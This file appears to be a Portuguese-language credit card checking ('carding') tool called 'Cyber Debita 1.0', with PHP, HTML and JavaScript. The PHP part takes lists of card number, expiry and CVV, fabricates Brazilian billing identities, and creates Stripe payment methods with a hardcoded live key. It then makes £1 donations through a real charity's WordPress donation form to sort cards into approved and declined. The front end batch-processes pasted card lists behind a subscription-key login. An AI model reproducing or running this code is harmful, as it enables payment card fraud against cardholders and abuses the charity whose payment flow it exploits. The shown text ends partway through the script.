<?php
// Verifica se é uma requisição da API (parâmetro 'lista' presente)
if (isset($_GET['lista']) && !empty($_GET['lista'])) {
    header('Content-Type: text/plain');
    
    $lista = $_GET['lista'];
    
    // Ignora ping test
    if ($lista === 'ping_test') {
        echo "pong";
        exit;
    }
    
    $dados = explode('|', $lista);
    if (count($dados) < 4) {
        echo "erro|formato_invalido";
        exit;
    }
    
    list($cc, $mes, $ano, $cvv) = $dados;
    if (strlen($ano) == 2) $ano = "20" . $ano;
    
    // Delay de 15 segundos
    sleep(15);
    
    function generateRandomData() {
        $firstNames = ['Marcos', 'Andre', 'Felipe', 'Ricardo', 'Bruno', 'Thiago', 'Lucas', 'Gabriel', 'Rafael', 'Diego', 'Juliana', 'Camila', 'Beatriz', 'Leticia', 'Fernanda', 'Amanda', 'Renata', 'Larissa', 'Patricia', 'Mariana'];
        $lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho', 'Almeida', 'Lopes', 'Soares', 'Fernandes', 'Vieira', 'Barbosa'];
        $cities = ['Sao Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Curitiba', 'Porto Alegre', 'Salvador', 'Fortaleza', 'Recife', 'Brasilia', 'Campinas'];
        $streets = ['Rua Treze de Maio', 'Avenida Paulista', 'Rua Augusta', 'Rua das Flores', 'Avenida Brasil', 'Rua Sete de Setembro', 'Rua Amazonas', 'Avenida Getulio Vargas'];
        
        $fName = $firstNames[array_rand($firstNames)];
        $lName = $lastNames[array_rand($lastNames)];
        $email = strtolower($fName . $lName . rand(100, 999) . '@gmail.com');
        
        return [
            'first_name' => $fName,
            'last_name' => $lName,
            'email' => $email,
            'city' => $cities[array_rand($cities)],
            'address' => $streets[array_rand($streets)] . ', ' . rand(1, 2000),
            'postcode' => rand(10000, 99999) . '-' . rand(100, 999),
            'phone' => '119' . rand(7000, 9999) . rand(1000, 9999)
        ];
    }
    
    $randomUser = generateRandomData();
    
    $publicKey = "pk_live_51I8YQMChDXVFdNz08f5bXJkM1uNqbRQf4appGKwoyQuqSWCMvxNLSNwp8VtM5EDWrIxICIsdtbHRI165D4ixonnD002VDgegEk";
    $siteUrl = "https://gaylifemagazine.co.uk";
    $userAgent = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36";
    
    function request($url, $method = 'GET', $headers = [], $postData = null, $cookies = null) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            if ($postData) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($postData) ? http_build_query($postData) : $postData);
            }
        }
        
        if ($headers) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        if ($cookies) curl_setopt($ch, CURLOPT_COOKIE, $cookies);
        
        curl_setopt($ch, CURLOPT_HEADER, true);
        $response = curl_exec($ch);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headerStr = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $headerStr, $matches);
        $newCookies = implode('; ', $matches[1]);
        
        curl_close($ch);
        return ['body' => $body, 'cookies' => $newCookies];
    }
    
    $donationPage = request("$siteUrl/campaigns/george-house-trust/donate/", "GET", ["User-Agent: $userAgent"]);
    $html = $donationPage['body'];
    $cookies = $donationPage['cookies'];
    
    preg_match('/name="_charitable_donation_nonce" value="([^"]+)"/', $html, $nonceMatch);
    $nonce = $nonceMatch[1] ?? "";
    
    preg_match('/name="charitable_form_id" value="([^"]+)"/', $html, $formIdMatch);
    $formId = $formIdMatch[1] ?? "";
    
    preg_match('/name="campaign_id" value="([^"]+)"/', $html, $campaignIdMatch);
    $campaignId = $campaignIdMatch[1] ?? "";
    
    if (empty($nonce) || empty($formId)) {
        echo "erro|tokens_nao_encontrados";
        exit;
    }
    
    $stripeData = [
        'type' => 'card',
        'billing_details[name]' => $randomUser['first_name'] . ' ' . $randomUser['last_name'],
        'billing_details[email]' => $randomUser['email'],
        'billing_details[address][city]' => $randomUser['city'],
        'billing_details[address][country]' => 'BR',
        'billing_details[address][line1]' => $randomUser['address'],
        'billing_details[address][postal_code]' => $randomUser['postcode'],
        'billing_details[phone]' => $randomUser['phone'],
        'card[number]' => $cc,
        'card[cvc]' => $cvv,
        'card[exp_month]' => $mes,
        'card[exp_year]' => $ano,
        'key' => $publicKey,
        'payment_user_agent' => 'stripe.js/f386584e69; stripe-js-v3/f386584e69; card-element'
    ];
    
    $stripeRes = request("https://api.stripe.com/v1/payment_methods", "POST", ["Origin: https://js.stripe.com", "Referer: https://js.stripe.com/", "User-Agent: $userAgent"], $stripeData);
    $stripeJson = json_decode($stripeRes['body'], true);
    
    if (!isset($stripeJson['id'])) {
        $errorMsg = $stripeJson['error']['message'] ?? 'Desconhecido';
        if (stripos($errorMsg, 'aven') !== false || stripos($errorMsg, 'bv') !== false) {
            echo "reprovada|$cc|$mes|$ano|$cvv|codigo_seguranca_invalido";
        } else {
            echo "reprovada|$cc|$mes|$ano|$cvv|" . strtolower($errorMsg);
        }
        exit;
    }
    
    $checkoutData = [
        'charitable_form_id' => $formId,
        $formId => '',
        '_charitable_donation_nonce' => $nonce,
        '_wp_http_referer' => '/campaigns/george-house-trust/donate/',
        'campaign_id' => $campaignId,
        'description' => 'George House Trust',
        'ID' => '71099',
        'custom_donation_amount' => '1',
        'first_name' => $randomUser['first_name'],
        'last_name' => $randomUser['last_name'],
        'email' => $randomUser['email'],
        'address' => $randomUser['address'],
        'city' => $randomUser['city'],
        'postcode' => $randomUser['postcode'],
        'country' => 'BR',
        'phone' => $randomUser['phone'],
        'gateway' => 'stripe',
        'stripe_payment_method' => $stripeJson['id'],
        'action' => 'make_donation',
        'form_action' => 'make_donation'
    ];
    
    $finalRes = request("$siteUrl/wp-admin/admin-ajax.php", "POST", [
        "Accept: application/json, text/javascript, */*; q=0.01",
        "X-Requested-With: XMLHttpRequest",
        "User-Agent: $userAgent"
    ], $checkoutData, $cookies);
    
    $responseBody = json_decode($finalRes['body'], true);
    
    if (isset($responseBody['success']) && $responseBody['success'] === true) {
        echo "aprovada|$cc|$mes|$ano|$cvv|debitou_1.00";
    } elseif (isset($responseBody['errors']) && is_array($responseBody['errors'])) {
        $errorMsg = implode(' ', $responseBody['errors']);
        if (stripos($errorMsg, 'securhiudty code') !== false) {
            echo "aprovada|$cc|$mes|$ano|$cvv|codigo_seguranca_invalido";
        } elseif (stripos($errorMsg, 'declined') !== false) {
            echo "reprovada|$cc|$mes|$ano|$cvv|cartao_recusado";
        } else {
            echo "reprovada|$cc|$mes|$ano|$cvv|" . strtolower($errorMsg);
        }
    } elseif (isset($responseBody['requires_action']) && $responseBody['requires_action'] === true) {
        echo "aprovada|$cc|$mes|$ano|$cvv|debitou_1.00";
    } else {
        echo "reprovada|$cc|$mes|$ano|$cvv|falha_processamento";
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber Debita 1.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #06060c;
            --bg-card: #0d0d16;
            --bg-glass: rgba(14, 14, 24, 0.75);
            --green: #00e676;
            --green-glow: rgba(0, 230, 118, 0.5);
            --red: #ff3d5a;
            --red-glow: rgba(255, 61, 90, 0.5);
            --blue: #40c4ff;
            --purple: #b388ff;
            --gold: #ffd740;
            --text: #e8e8f0;
            --text-dim: #9090a0;
            --text-muted: #5c5c6e;
            --border: rgba(255,255,255,0.06);
            --border-active: rgba(255,255,255,0.12);
            --radius: 18px;
            --radius-sm: 12px;
            --radius-xs: 8px;
            --shadow-card: 0 8px 40px rgba(0,0,0,0.5);
            --shadow-btn: 0 8px 25px;
            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-spring: 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', system-ui, sans-serif;
            background: var(--bg-deep);
            color: var(--text);
            min-height: 100vh;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }

        /* ============ AMBIENT BACKGROUND ============ */
        .ambient-bg {
            position: fixed;
            inset: 0;
            z-index: 0;
            overflow: hidden;
            pointer-events: none;
        }
        .ambient-orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(100px);
            opacity: 0.12;
            animation: orbFloat 25s infinite ease-in-out;
        }
        .ambient-orb:nth-child(1) { width: 600px; height: 600px; background: var(--green); top: -20%; left: -15%; animation-delay: 0s; }
        .ambient-orb:nth-child(2) { width: 450px; height: 450px; background: var(--purple); top: 50%; right: -12%; animation-delay: -8s; }
        .ambient-orb:nth-child(3) { width: 380px; height: 380px; background: var(--blue); bottom: -15%; left: 35%; animation-delay: -16s; }

        @keyframes orbFloat {
            0%,100% { transform: translate(0,0) scale(1); }
            25% { transform: translate(60px,-40px) scale(1.08); }
            50% { transform: translate(-30px,50px) scale(0.92); }
            75% { transform: translate(-50px,-30px) scale(1.04); }
        }

        .grid-pattern {
            position: fixed;
            inset: 0;
            background-image: linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: 0;
            pointer-events: none;
        }

        /* ============ LOGIN SCREEN ============ */
        .login-screen {
            position: fixed;
            inset: 0;
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
            background: url('foto1.png') center/cover no-repeat;
        }
        .login-screen::before {
            content: '';
            position: absolute;
            inset: 0;
            background: rgba(0,0,0,0.55);
            backdrop-filter: blur(4px);
        }
        .login-card {
            position: relative;
            z-index: 1;
            width: 90%;
            max-width: 420px;
            background: rgba(8,8,14,0.65);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 28px;
            padding: 45px 35px 40px;
            text-align: center;
            box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.04);
            animation: cardAppear 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        @keyframes cardAppear {
            from { opacity: 0; transform: translateY(50px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        .login-icon {
            width: 65px;
            height: 65px;
            margin: 0 auto 22px;
            background: linear-gradient(135deg, #00e676, #00c853);
            border-radius: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8em;
            box-shadow: 0 15px 40px rgba(0,230,118,0.35);
            animation: iconPulse 2.5s infinite;
        }
        @keyframes iconPulse {
            0%,100% { box-shadow: 0 15px 40px rgba(0,230,118,0.35); }
            50% { box-shadow: 0 15px 55px rgba(0,230,118,0.55); }
        }
        .login-card h1 {
            font-size: 2em;
            font-weight: 800;
            margin-bottom: 4px;
            background: linear-gradient(180deg, #fff 30%, #b0b0c0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }
        .login-card .sub {
            font-size: 0.8em;
            color: var(--text-dim);
            margin-bottom: 28px;
            letter-spacing: 2.5px;
            text-transform: uppercase;
            font-weight: 500;
        }
        .login-card input {
            width: 100%;
            padding: 14px 18px;
            border: 1.5px solid rgba(255,255,255,0.06);
            border-radius: var(--radius-sm);
            background: rgba(255,255,255,0.03);
            color: #fff;
            font-size: 0.95em;
            font-family: 'Inter', sans-serif;
            text-align: center;
            letter-spacing: 1.5px;
            outline: none;
            transition: all var(--transition);
        }
        .login-card input:focus {
            border-color: var(--green);
            background: rgba(0,230,118,0.04);
            box-shadow: 0 0 35px rgba(0,230,118,0.1);
        }
        .login-card input::placeholder { color: rgba(255,255,255,0.2); letter-spacing: 1px; }
        .login-card button {
            width: 100%;
            padding: 15px;
            margin-top: 18px;
            border: none;
            border-radius: var(--radius-sm);
            background: linear-gradient(135deg, #00e676, #00c853);
            color: #000;
            font-size: 1em;
            font-weight: 700;
            cursor: pointer;
            transition: all var(--transition-spring);
            letter-spacing: 0.5px;
            font-family: 'Inter', sans-serif;
        }
        .login-card button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(0,230,118,0.45);
        }
        .login-error {
            color: #ff5252;
            margin-top: 12px;
            font-size: 0.8em;
            font-weight: 500;
            display: none;
            padding: 10px 14px;
            background: rgba(255,61,90,0.08);
            border-radius: var(--radius-xs);
            border: 1px solid rgba(255,61,90,0.2);
        }
        .login-error.show { display: block; animation: shake 0.5s; }
        @keyframes shake {
            0%,100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            75% { transform: translateX(6px); }
        }

        /* ============ MAIN PANEL ============ */
        .main-panel {
            display: none;
            position: relative;
            z-index: 2;
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px 25px;
            animation: fadeUp 0.5s ease;
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(25px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .topbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
            padding: 15px 0 20px;
            margin-bottom: 20px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .topbar .brand {
            font-size: 1.8em;
            font-weight: 900;
            background: linear-gradient(135deg, #fff, var(--green), var(--blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -1px;
        }
        .topbar .user-tag {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: var(--bg-glass);
            border: 1px solid var(--border);
            border-radius: 50px;
            padding: 8px 18px;
            font-size: 0.82em;
            color: var(--text-dim);
            backdrop-filter: blur(12px);
        }
        .user-tag .live-dot {
            width: 8px; height: 8px;
            border-radius: 50%;
            background: var(--green);
            box-shadow: 0 0 10px var(--green-glow);
        }

        .stats-row {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .stat-card {
            flex: 1;
            min-width: 140px;
            background: var(--bg-glass);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 18px 20px;
            backdrop-filter: blur(12px);
            display: flex;
            align-items: center;
            gap: 12px;
            transition: all var(--transition);
        }
        .stat-card .stat-icon {
            font-size: 1.6em;
            width: 48px; height: 48px;
            border-radius: var(--radius-sm);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        .stat-card .stat-icon.green { background: rgba(0,230,118,0.1); }
        .stat-card .stat-icon.red { background: rgba(255,61,90,0.1); }
        .stat-card .stat-icon.blue { background: rgba(64,196,255,0.1); }
        .stat-card .stat-label { font-size: 0.72em; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1.5px; font-weight: 600; }
        .stat-card .stat-value { font-size: 1.5em; font-weight: 800; }
        .stat-card .stat-value.green { color: var(--green); }
        .stat-card .stat-value.red { color: var(--red); }
        .stat-card .stat-value.blue { color: var(--blue); }

        .workspace {
            background: var(--bg-glass);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 22px;
            margin-bottom: 20px;
            backdrop-filter: blur(12px);
        }
        .workspace-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 14px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .workspace-header h3 {
            font-size: 0.85em;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: var(--text-dim);
        }
        .workspace textarea {
            width: 100%;
            height: 170px;
            background: rgba(0,0,0,0.45);
            border: 1.5px solid rgba(255,255,255,0.06);
            border-radius: var(--radius-sm);
            padding: 16px;
            color: #a5d6a7;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.85em;
            resize: vertical;
            outline: none;
            line-height: 1.7;
            transition: all var(--transition);
        }
        .workspace textarea:focus {
            border-color: rgba(0,230,118,0.35);
            box-shadow: 0 0 30px rgba(0,230,118,0.06);
        }
        .workspace textarea::placeholder { color: rgba(255,255,255,0.1); }

        .btn-row {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 16px;
        }
        .btn {
            padding: 12px 26px;
            border: none;
            border-radius: var(--radius-sm);
            font-weight: 700;
            font-size: 0.85em;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: all var(--transition-spring);
            font-family: 'Inter', sans-serif;
            display: inline-flex;
            align-items: center;
            gap: 7px;
        }
        .btn-start {
            background: linear-gradient(135deg, #00e676, #00c853);
            color: #000;
            box-shadow: var(--shadow-btn) rgba(0,230,118,0.25);
        }
        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 14px 35px rgba(0,230,118,0.4); }
        .btn-stop {
            background: linear-gradient(135deg, #ff3d5a, #d50000);
            color: #fff;
            box-shadow: var(--shadow-btn) rgba(255,61,90,0.25);
        }
        .btn-stop:hover { transform: translateY(-2px); box-shadow: 0 14px 35px rgba(255,61,90,0.4); }
        .btn-clear {
            background: rgba(255,255,255,0.04);
            color: #fff;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .btn-clear:hover { background: rgba(255,255,255,0.08); }
        .btn:disabled { opacity: 0.35; cursor: not-allowed; transform: none !important; box-shadow: none !important; filter: grayscale(40%); }

        .progress-wrap { margin-top: 15px; }
        .progress-info { display: flex; justify-content: space-between; font-size: 0.75em; color: var(--text-muted); margin-bottom: 6px; }
        .progress-bar { height: 5px; background: rgba(255,255,255,0.04); border-radius: 3px; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--green), var(--blue)); width: 0%; transition: width 0.4s ease; border-radius: 3px; }

        .results-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 18px;
        }
        @media (max-width: 850px) { .results-grid { grid-template-columns: 1fr; } }

        .result-panel {
            background: var(--bg-glass);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 20px;
            min-height: 260px;
            max-height: 420px;
            overflow-y: auto;
            backdrop-filter: blur(12px);
        }
        .result-panel::-webkit-scrollbar { width: 4px; }
        .result-panel::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); border-radius: 8px; }
        .result-panel .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .panel-header .title { font-weight: 700; font-size: 0.9em; display: flex; align-items: center; gap: 6px; }
        .panel-header .count {
            font-size: 0.75em;
            padding: 5px 14px;
            border-radius: 50px;
            font-weight: 700;
        }
        .live-panel { border-color: rgba(0,230,118,0.15); }
        .live-panel .title { color: var(--green); }
        .live-panel .count { background: rgba(0,230,118,0.12); color: var(--green); }
        .die-panel { border-color: rgba(255,61,90,0.15); }
        .die-panel .title { color: var(--red); }
        .die-panel .count { background: rgba(255,61,90,0.12); color: var(--red); }

        .result-line {
            padding: 11px 14px;
            margin-bottom: 7px;
            border-radius: var(--radius-xs);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.78em;
            word-break: break-all;
            line-height: 1.4;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-15px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .result-line.live { background: rgba(0,230,118,0.05); border-left: 3px solid var(--green); color: #81c784; }
        .result-line.die { background: rgba(255,61,90,0.05); border-left: 3px solid var(--red); color: #ef9a9a; }
        .result-line.processing { background: rgba(255,215,64,0.05); border-left: 3px solid var(--gold); color: #ffe082; animation: pulse 1.4s infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.45; } }

        .logout-fab {
            position: fixed;
            bottom: 25px;
            right: 25px;
            z-index: 100;
            width: 46px; height: 46px;
            border-radius: 50%;
            background: rgba(255,61,90,0.1);
            border: 1px solid rgba(255,61,90,0.25);
            color: var(--red);
            cursor: pointer;
            font-size: 1.1em;
            display: none;
            align-items: center;
            justify-content: center;
            transition: all var(--transition-spring);
            backdrop-filter: blur(10px);
        }
        .logout-fab:hover { background: rgba(255,61,90,0.2); transform: scale(1.08); }

        iframe { display: none; }

        @media (max-width: 500px) {
            .login-card { padding: 30px 20px; }
            .login-card h1 { font-size: 1.5em; }
            .topbar .brand { font-size: 1.4em; }
            .btn { padding: 10px 18px; font-size: 0.78em; }
        }
    </style>
</head>
<body>
    <div class="ambient-bg">
        <div class="ambient-orb"></div>
        <div class="ambient-orb"></div>
        <div class="ambient-orb"></div>
    </div>
    <div class="grid-pattern"></div>

    <!-- LOGIN -->
    <div class="login-screen" id="loginScreen">
        <div class="login-card">
            <div class="login-icon">⚡</div>
            <h1>Cyber Debita 1.0</h1>
            <p class="sub">Payment Verification</p>
            <input type="password" id="keyInput" placeholder="DIGITE SUA KEY" autocomplete="off">
            <button onclick="doLogin()">🚀 ACESSAR</button>
            <div class="login-error" id="loginError"></div>
        </div>
    </div>

    <!-- MAIN PANEL -->
    <div class="main-panel" id="mainPanel">
        <div class="topbar">
            <span class="brand">⚡ Cyber Debita 1.0</span>
            <span class="user-tag"><span class="live-dot"></span> <span id="userInfo"></span></span>
        </div>

        <div class="stats-row">
            <div class="stat-card">
                <div class="stat-icon blue">📡</div>
                <div><div class="stat-label">Status</div><div class="stat-value blue" id="sysStatus">PARADO</div></div>
            </div>
            <div class="stat-card">
                <div class="stat-icon green">✅</div>
                <div><div class="stat-label">Aprovadas</div><div class="stat-value green" id="liveCount">0</div></div>
            </div>
            <div class="stat-card">
                <div class="stat-icon red">❌</div>
                <div><div class="stat-label">Reprovadas</div><div class="stat-value red" id="dieCount">0</div></div>
            </div>
            <div class="stat-card">
                <div class="stat-icon blue">⏱</div>
                <div><div class="stat-label">Ping</div><div class="stat-value blue" id="pingVal">--</div></div>
            </div>
        </div>

        <div class="workspace">
            <div class="workspace-header">
                <h3>📋 Lista de Cartões</h3>
                <span style="font-size:0.7em;color:var(--text-muted);">numero|mes|ano|cvv</span>
            </div>
            <textarea id="cardList" placeholder="Cole sua lista aqui...&#10;&#10;5546126716936334|12|2028|216&#10;4532123456789012|06|2026|123"></textarea>
            <div class="btn-row">
                <button class="btn btn-start" id="btnStart" onclick="start()">▶ Iniciar</button>
                <button class="btn btn-stop" id="btnStop" onclick="stop()" disabled>⏹ Parar</button>
                <button class="btn btn-clear" onclick="clearAll()">🗑 Limpar</button>
            </div>
            <div class="progress-wrap">
                <div class="progress-info"><span>Progresso</span><span id="progPct">0%</span></div>
                <div class="progress-bar"><div class="progress-fill" id="progBar"></div></div>
            </div>
        </div>

        <div class="results-grid">
            <div class="result-panel live-panel">
                <div class="panel-header"><span class="title">✅ APROVADAS</span><span class="count" id="liveBadge">0</span></div>
                <div id="liveOut"><div style="color:var(--text-muted);text-align:center;padding:30px;">Aguardando...</div></div>
            </div>
            <div class="result-panel die-panel">
                <div class="panel-header"><span class="title">❌ REPROVADAS</span><span class="count" id="dieBadge">0</span></div>
                <div id="dieOut"><div style="color:var(--text-muted);text-align:center;padding:30px;">Aguardando...</div></div>
            </div>
        </div>
    </div>

    <button class="logout-fab" id="logoutBtn" onclick="logout()" title="Sair">🚪</button>

    <iframe id="ytPlayer" src="https://www.youtube.com/embed/75bCm-EDnpk?autoplay=1&loop=1&playlist=75bCm-EDnpk&controls=0&showinfo=0&rel=0&iv_load_policy=3" allow="autoplay; encrypted-media" allowfullscreen></iframe>

    <script>
        const KEYS = {
            'dopeey2233vipbot/id223309893': {user:'@dopeeydev',exp:'14/07/2026',status:'pago',plan:'VIP'},
            'chuky2233vipbot/id223309893': {user:'@chuckysuport',exp:'14/07/2026',status:'pendente',plan:'VIP'},
            'kggs012233vipbot/id228565959565': {user:'@kggs01',exp:'14/07/2026',status:'pago',plan:'PROMO'},
            '772233vipbot/id258484895': {user:'@77',exp:'14/07/2026',status:'pago',plan:'PROMO'}
        };

        let running = false, cards = [], idx = 0, liveN = 0, dieN = 0, procN = 0, user = null, ctrl = null;

        const $ = id => document.getElementById(id);
        const DOM = {
            loginScreen:$('loginScreen'), mainPanel:$('mainPanel'), keyInput:$('keyInput'), loginError:$('loginError'),
            userInfo:$('userInfo'), cardList:$('cardList'), btnStart:$('btnStart'), btnStop:$('btnStop'),
            sysStatus:$('sysStatus'), liveCount:$('liveCount'), dieCount:$('dieCount'), pingVal:$('pingVal'),
            liveOut:$('liveOut'), dieOut:$('dieOut'), liveBadge:$('liveBadge'), dieBadge:$('dieBadge'),
            progBar:$('progBar'), progPct:$('progPct'), logoutBtn:$('logoutBtn')
        };

        function doLogin() {
            const key = DOM.keyInput.value.trim();
            if (!key) return showErr('Digite a key!');
            const data = KEYS[key];
            if (!data) return showErr('Key inválida!'), shake(DOM.keyInput);
            if (data.status === 'desativado') return showErr('Key desativada!');
            user = data;
            DOM.loginScreen.style.display = 'none';
            DOM.mainPanel.style.display = 'block';
            DOM.logoutBtn.style.display = 'flex';
            DOM.userInfo.textContent = `${data.user} | ${data.exp} | ${data.plan}`;
            sessionStorage.setItem('cyber_key', key);
            sessionStorage.setItem('cyber_user', JSON.stringify(data));
            ping();
        }

        function showErr(msg) {
            DOM.loginError.textContent = msg;
            DOM.loginError.classList.add('show');
            setTimeout(() => DOM.loginError.classList.remove('show'), 3200);
        }
        function shake(el) {
            el.style.borderColor = '#ff5252';
            setTimeout(() => el.style.borderColor = '', 1800);
        }

        DOM.keyInput.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });

        (function restore() {
            const k = sessionStorage.getItem('cyber_key');
            const u = sessionStorage.getItem('cyber_user');
            if (k && KEYS[k] && u) {
                user = JSON.parse(u);
                DOM.loginScreen.style.display = 'none';
                DOM.mainPanel.style.display = 'block';
                DOM.logoutBtn.style.display = 'flex';
                DOM.userInfo.textContent = `${user.user} | ${user.exp} | ${user.plan}`;
                ping();
            }
        })();

        function logout() {
            if (running && !confirm('Processo em andamento. Sair?')) return;
            stop();
            sessionStorage.clear();
            user = null;
            DOM.mainPanel.style.display = 'none';
            DOM.logoutBtn.style.display = 'none';
            DOM.loginScreen.style.display = 'flex';
            DOM.keyInput.value = '';
            resetData();
        }

        function start() {
            if (running) return;
            const raw = DOM.cardList.value.trim();
            if (!raw) return alert('Insira uma lista!');
            cards = raw.split('\n').filter(l => l.trim());
            if (!cards.length) return alert('Lista vazia!');
            running = true; idx = 0; liveN = 0; dieN = 0; procN = 0;
            DOM.liveOut.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:30px;">Processando...</div>';
            DOM.dieOut.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:30px;">Aguardando...</div>';
            updateCounters();
            DOM.btnStart.disabled = true;
            DOM.btnStop.disabled = false;
            DOM.sysStatus.textContent = 'ATIVO';
            DOM.cardList.disabled = true;
            DOM.progBar.style.width = '0%';
            DOM.progPct.textContent = '0%';
            ping();
            next();
        }

        function stop() {
            running = false;
            if (ctrl) { ctrl.abort(); ctrl = null; }
            DOM.btnStart.disabled = false;
            DOM.btnStop.disabled = true;
            DOM.sysStatus.textContent = 'PARADO';
            DOM.cardList.disabled = false;
        }

        function clearAll() {
            if (running) { if (!confirm('Parar e limpar?')) return; stop(); }
            resetData();
        }

        function resetData() {
            DOM.cardList.value = '';
            DOM.liveOut.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:30px;">Aguardando...</div>';
            DOM.dieOut.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:30px;">Aguardando...</div>';
            liveN = 0; dieN = 0; procN = 0; cards = []; idx = 0;
            DOM.progBar.style.width = '0%'; DOM.progPct.textContent = '0%';
            DOM.cardList.disabled = false;
            updateCounters();
        }

        function updateCounters() {
            DOM.liveCount.textContent = liveN;
            DOM.dieCount.textContent = dieN;
            DOM.liveBadge.textContent = liveN;
            DOM.dieBadge.textContent = dieN;
        }

        function ping() {
            const t = performance.now();
            fetch('?lista=ping_test&_=' + Date.now(), {cache:'no-cache'})
                .then(() => { DOM.pingVal.textContent = Math.round(performance.now() - t) + 'ms'; })
                .catch(() => { DOM.pingVal.textContent = '--'; });
        }

        function next() {
            if (!running) return;
            if (idx >= cards.length) {
                stop();
                DOM.sysStatus.textContent = 'CONCLUÍDO';
                DOM.progBar.style.width = '100%';
                DOM.progPct.textContent = '100%';
                DOM.cardList.disabled = false;
                return;
            }

            const card = cards[idx].trim();
            if (!card) { idx++; next(); return; }

            DOM.sysStatus.textContent = `${idx+1}/${cards.length}`;
            const pct = Math.round((idx / cards.length) * 100);
            DOM.progBar.style.width = pct + '%';
            DOM.progPct.textContent = pct + '%';

            const tmpId = 't' + Date.now();
            const tmp = document.createElement('div');
            tmp.id = tmpId;
            tmp.className = 'result-line processing';
            tmp.textContent = '⏳ ' + card;
            DOM.liveOut.insertBefore(tmp, DOM.liveOut.firstChild);

            ctrl = new AbortController();
            fetch('?lista=' + encodeURIComponent(card) + '&_=' + Date.now(), {signal: ctrl.signal, cache:'no-cache'})
                .then(r => { if (!r.ok) throw new Error('HTTP ' + r.status); return r.text(); })
                .then(data => {
                    const el = document.getElementById(tmpId); if (el) el.remove();
